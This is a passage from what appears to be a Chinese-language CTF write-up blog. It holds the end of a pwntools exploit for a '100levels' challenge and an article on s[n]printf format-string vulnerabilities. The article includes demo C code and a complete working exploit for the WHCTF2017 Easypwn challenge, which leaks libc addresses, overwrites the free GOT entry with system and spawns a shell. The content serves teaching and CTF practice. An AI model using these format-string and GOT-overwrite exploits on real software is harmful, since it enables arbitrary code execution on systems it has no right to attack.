<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;61.147.171.105&#x27;, 53943)</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">bias = one_gadget - system</span><br><span class="line">sla(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;levels?&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;more?&#x27;</span>, <span class="built_in">str</span>(bias).encode())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Question: &#x27;</span>)</span><br><span class="line">    q = ru(<span class="string">b&#x27; =&#x27;</span>).decode().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    ans = <span class="built_in">int</span>(q[<span class="number">0</span>]) * <span class="built_in">int</span>(q[<span class="number">2</span>])</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    sla(<span class="string">b&#x27;Answer:&#x27;</span>, <span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">Vsyscall = p64(<span class="number">0xffffffffff600400</span>)</span><br><span class="line">payload = padding + Vsyscall * <span class="number">3</span></span><br><span class="line">sa(<span class="string">b&#x27;Answer:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>s[n]printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
    <url>/2025/03/09/s-n-printf%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä¸»è¦ä»‹ç»<code>s[n]printf</code>çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨æ³•ä»¥åŠå’Œprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŒºåˆ«</p>
<span id="more"></span>

<h1 id="s-n-printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#s-n-printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="s[n]printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>s[n]printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><h2 id="s-n-printfå‡½æ•°ä»‹ç»"><a href="#s-n-printfå‡½æ•°ä»‹ç»" class="headerlink" title="s[n]printfå‡½æ•°ä»‹ç»"></a>s[n]printfå‡½æ•°ä»‹ç»</h2><p>å‡½æ•°åŸå‹<code>int s[n]printf(char *str, size_t size, const char *format, ...);</code> ä½œç”¨å’Œprintfç±»ä¼¼ åªä¸è¿‡åŸæ¥è¾“å‡ºåˆ°ç»ˆç«¯çš„ç»“æœä¼šä¿ç•™åœ¨<code>str</code>ä¸­ è¿”å›å€¼æ˜¯å‘<code>str</code>ä¸­è¾“å…¥çš„å­—ç¬¦ä¸ªæ•° <code>snprintf</code>å’Œ<code>sprintf</code>çš„åŒºåˆ«æ˜¯å‰è€…é™åˆ¶äº†å¯å†™å…¥å­—ç¬¦æ•°</p>
<h2 id="æ›´å¤šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¯èƒ½æ€§"><a href="#æ›´å¤šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¯èƒ½æ€§" class="headerlink" title="æ›´å¤šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¯èƒ½æ€§"></a>æ›´å¤šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¯èƒ½æ€§</h2><p>ä¸printfç›¸æ¯”s[n]printfæ˜¯ä¸€ç§æ›´å±é™©çš„æ ¼å¼åŒ–è¾“å‡ºæ–¹å¼ åŸå› ä¹‹ä¸€æ˜¯å³ä½¿ç”¨æˆ·èƒ½æ§åˆ¶çš„ä¸æ˜¯å‚æ•°<code>format</code>ä¹Ÿæ˜¯æœ‰é€ æˆæ¼æ´çš„å¯èƒ½æ€§çš„</p>
<p>è€ƒè™‘ä»¥ä¸‹æƒ…å†µ:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*    stack frame:</span></span><br><span class="line"><span class="comment">*    &lt;low&gt;</span></span><br><span class="line"><span class="comment">*    buf2[0x20]</span></span><br><span class="line"><span class="comment">*    buf3[0x20]</span></span><br><span class="line"><span class="comment">*    buf1[0x100]</span></span><br><span class="line"><span class="comment">*    &lt;high&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">buf3 = <span class="string">&quot;%s\x00&quot;</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf2, buf3, buf1);</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·å¯ä»¥æ§åˆ¶<code>buf1</code> ä½†æ˜¯æ˜æ˜¾å½“å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ£€æµ‹åˆ°<code>%s</code>æ—¶ è‹¥buf1(<strong>æœªè¢«bâ€™\x00â€™æˆªæ–­</strong>)çš„é•¿åº¦å¤§äº0x20æ—¶ ç»§ç»­å¤åˆ¶å­—ç¬¦åˆ°buf2ä¼šå¯¼è‡´æº¢å‡ºè‡³æ ¼å¼åŒ–å­—ç¬¦ä¸²buf3</p>
<p>ç”±äºbuf3ä¸­â€%sâ€çš„åŠŸèƒ½åœ¨å®ç°è¿‡ç¨‹ä¸­å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è§£æå·²ç»è¿›è¡Œåˆ°â€%s<strong>xxx</strong>â€œä¸­ç²—ä½“çš„éƒ¨åˆ†äº† æ‰€ä»¥è¦æƒ³ä¿®æ”¹æˆçš„ç›®æ ‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ç”Ÿæ•ˆéœ€è¦å¡«å……è¿™ä¸¤ä¸ªè¢«è§£æè¿‡çš„å­—ç¬¦</p>
<p>æ–°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²(xxxçš„éƒ¨åˆ†)çš„è§£æä¹Ÿæ˜¯åŸºäºs[n]printfåœ¨è°ƒç”¨å‰ä¸€åˆ»çš„<code>RSP</code>çš„</p>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p>ä»¥ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„ç¨‹åºä¸ºä¾‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf1[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> buf3[<span class="number">0x20</span>] = <span class="string">&quot;%s\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buf2[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf1, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf1, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf2, buf3, buf1);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¨¡æ‹Ÿäº†ä¸Šæ–‡æåˆ°çš„é‚£ç§æƒ…å†µ ç®€å•å‘é€ä¸€ä¸ªæ³„éœ²<code>RSI</code>å‚¨å­˜çš„æŒ‡é’ˆçš„payloadè¿›è¡Œå®éªŒ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;==%p&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨å‰:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213717.png" alt="image-20250309213710036"></p>
<p>è°ƒç”¨å:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F09%2F20250309-213818.png" alt="image-20250309213818785"></p>
<p>å¯ä»¥çœ‹åˆ°æ–°è¦†ç›–ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²è¢«æˆåŠŸçš„è§£æäº† åŒæ—¶æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²è§£æè§„åˆ™ è¿™æ®µæ–°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿå°†è¢«å¤åˆ¶åˆ°buf2ä¸­ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåé¢ä¼šä¸æ–­é‡å¤è¿™ä¸ªè¾“å‡º</p>
<p>è¿™é‡Œå†ä»‹ç»ä¸€ä¸‹</p>
<h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨s-n-printfä¸­è§£æçš„è§„åˆ™"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨s-n-printfä¸­è§£æçš„è§„åˆ™" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨s[n]printfä¸­è§£æçš„è§„åˆ™"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨s[n]printfä¸­è§£æçš„è§„åˆ™</h3><p>ä»¥è¿™æ ·ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºä¾‹: <code>b&#39;%s1234%567c%7$hhn&#39;</code></p>
<p>å¯ä»¥å°†å…¶åˆ†æ®µæˆä»¥ä¸‹å½¢å¼<code>b&#39;[%s][1234][%567c][%7$hhn]&#39;</code></p>
<ol>
<li>%sä¼šæ‰“å°ç¬¬äºŒä¸ªå‚æ•°å­˜æ”¾çš„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²</li>
<li>æ‰“å°â€™1234â€™</li>
<li>è¾“å‡º567ä¸ªç©ºæ ¼</li>
<li>å°†ä¸Šé¢è¾“å‡ºçš„æ‰€æœ‰ä¸œè¥¿çš„å­—ç¬¦æ•° &amp; 0xffå†™å…¥<code>RSP</code>æŒ‡å‘ä½ç½®å­˜æ”¾çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜</li>
</ol>
<p>å¯¹æ–°æ·»åŠ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åŒæ ·é€‚ç”¨ ç›´åˆ°è¢«bâ€™\x00â€™æˆªæ–­</p>
<p>çœ‹ä¸€é“é¢˜ç›®æ¥åŠ æ·±ç†è§£</p>
<h3 id="æ”»é˜²ä¸–ç•Œ-Easypwn"><a href="#æ”»é˜²ä¸–ç•Œ-Easypwn" class="headerlink" title="[æ”»é˜²ä¸–ç•Œ] Easypwn"></a>[æ”»é˜²ä¸–ç•Œ] Easypwn</h3><p>checksecé™¤äº†RELROä¿æŠ¤å…¨å¼€</p>
<p>ä¼ªä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *name; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Input Your Code:\n&quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%4s&quot;</span>, nptr);</span><br><span class="line">    v5 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      get_input();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      name = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot;Input Your Name:\n&quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">      read(<span class="number">0</span>, name, <span class="number">0x100</span>uLL);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;OK!I Know Your Name :%sNow!&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)name);</span><br><span class="line">      <span class="built_in">free</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">1024</span>]; <span class="comment">// [rsp+10h] [rbp-BF0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">1000</span>]; <span class="comment">// [rsp+410h] [rbp-7F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s3[<span class="number">1024</span>]; <span class="comment">// [rsp+7F8h] [rbp-408h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+BF8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">memset</span>(s3, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s2, <span class="number">0</span>, <span class="number">0x7E8</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(s3, <span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome To WHCTF2017:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s1, <span class="number">0x438</span>uLL);</span><br><span class="line">  <span class="built_in">snprintf</span>(s2, <span class="number">0x7D0</span>uLL, s3, s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Input Is :%s\n&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜æ˜¾<code>get_input()</code>ä¸­å°±æœ‰ä¸Šæ–‡æåˆ°çš„æ¼æ´ å”¯ä¸€çš„éš¾ç‚¹å°±æ˜¯å¦‚ä½•åˆ©ç”¨ </p>
<p>ç¬¬ä¸€æ­¥è¿˜æ˜¯å…ˆå°½å¯èƒ½æ³„éœ²èƒ½ç”¨åˆ°çš„å€¼ è¿™é‡Œé€‰æ‹©æ³„éœ²libcåŸºå€å’Œç¨‹åºè¢«è½½å…¥çš„åŸºå€ åŠ¨æ€è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹è·ç¦»<code>RSP</code>å¤šè¿œå³å¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Code:\n&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">payload = padding + <span class="string">b&#x27;++|1|%397$p|2|%389$p|3|&#x27;</span></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">program_base = leak - <span class="number">0xcf9</span></span><br><span class="line">log.success(<span class="string">&#x27;program_base = %#x&#x27;</span> % program_base)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çš„æ€è·¯æœ‰å‡ ç§ ä¸€ç§æ˜¯ç›´æ¥ä¿®æ”¹freeçš„gotè¡¨ä¸ºsystem ç„¶ååœ¨<code>name</code>ä¸­å­˜å…¥bâ€™&#x2F;bin&#x2F;sh\x00â€™åfreeæ‰ æˆ–è€…é€šè¿‡get_inputçš„RBPä¿®æ”¹mainçš„RBP è¿›ä¸€æ­¥ä¿®æ”¹mainçš„è¿”å›åœ°å€æ‰“ret2libc</p>
<p>ä½†æ˜¯è¿™é¢˜é™åˆ¶äº†è¾“å…¥çš„æ¬¡æ•° æ‰€ä»¥é€‰æ‹©æ”¹gotè¡¨</p>
<p>é‚£å°±éœ€è¦å¾€æ ˆä¸Šå†™å…¥freeçš„gotè¡¨åœ°å€ è€Œè¿™ä¸ªåœ°å€æ˜¯ä¸€å®šä¼šæŠŠå­—ç¬¦ä¸²ç»™æˆªæ–­çš„ æ‰€ä»¥éœ€è¦æ”¾åœ¨æœ€å å‰©ä¸‹çš„å°±æ˜¯è®¡ç®—å†™å…¥çš„å®é™…å­—èŠ‚ä¸payloadçš„å…³ç³»äº† æœ€åæ„é€ ä¸€ä¸ªå‘gotè¡¨å†™å…¥å­—èŠ‚çš„å‡½æ•°:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte_at</span>(<span class="params">byte, addr</span>):</span><br><span class="line">    payload  = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">    payload_ = <span class="string">f&#x27;==%<span class="subst">&#123;<span class="number">258</span> + byte&#125;</span>c%133$hhn&#x27;</span>.encode()</span><br><span class="line">    payload_ += <span class="string">b&#x27;=&#x27;</span> + p64(addr)    <span class="comment"># è¿™ä¸€æ­¥æ˜¯ä¸ºäº†æ ˆå¯¹é½</span></span><br><span class="line">    payload  += payload_</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Code:\n&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte_at</span>(<span class="params">byte, addr</span>):</span><br><span class="line">    payload  = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line">    payload_ = <span class="string">f&#x27;==%<span class="subst">&#123;<span class="number">258</span> + byte&#125;</span>c%133$hhn&#x27;</span>.encode()</span><br><span class="line">    payload_ += <span class="string">b&#x27;=&#x27;</span> + p64(addr)</span><br><span class="line">    payload  += payload_</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&#x27;localhost&#x27;, 20000)</span></span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.106&#x27;</span>, xxxxx)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;1&#x27;</span> * <span class="number">1000</span></span><br><span class="line"><span class="comment"># payload = padding + b&#x27;++&#x27; + &#x27;-&#x27;.join([f&#x27;|&#123;i&#125;|%&#123;i&#125;$p&#x27; for i in range(389, 392)]).encode()</span></span><br><span class="line">payload = padding + <span class="string">b&#x27;++|1|%397$p|2|%389$p|3|&#x27;</span></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">sa(<span class="string">b&#x27;WHCTF2017:&#x27;</span>, payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leak - <span class="number">0x20830</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">program_base = leak - <span class="number">0xcf9</span></span><br><span class="line">log.success(<span class="string">&#x27;program_base = %#x&#x27;</span> % program_base)</span><br><span class="line"></span><br><span class="line">got_free = program_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libc_base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">to_write = system.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    write_byte_at(to_write[i], got_free + i)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="æ›´å±é™©çš„å¦ä¸€ä¸ªåŸå› "><a href="#æ›´å±é™©çš„å¦ä¸€ä¸ªåŸå› " class="headerlink" title="æ›´å±é™©çš„å¦ä¸€ä¸ªåŸå› "></a>æ›´å±é™©çš„å¦ä¸€ä¸ªåŸå› </h2><p>å®é™…ä¸Šprintfå’Œs[n]printfåœ¨åº•å±‚å®ç°ä¸Šå°±æ˜¯ä¸åŒçš„ s[n]printfç›´åˆ°ä¸Šæ–‡å®ä¾‹ä¸­ä½¿ç”¨çš„ä»£ç çš„é“¾æ¥åº“ç‰ˆæœ¬glibc 2.40ä¾ç„¶å­˜åœ¨åŠ¨æ€è§£ææ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åŠŸèƒ½ è€ŒåŒæ ·çš„é“¾æ¥åº“ç‰ˆæœ¬ç¼–è¯‘å‡ºçš„ç¨‹åºprintféƒ½æ²¡æœ‰è¿™æ ·çš„åŠŸèƒ½</p>
<h3 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>è€ƒè™‘ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„ç¨‹åº:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">__int64_t</span> var1 = <span class="number">0</span>, var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">__int64_t</span> *ptr1 = &amp;var1, **ptr2 = &amp;ptr1;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span 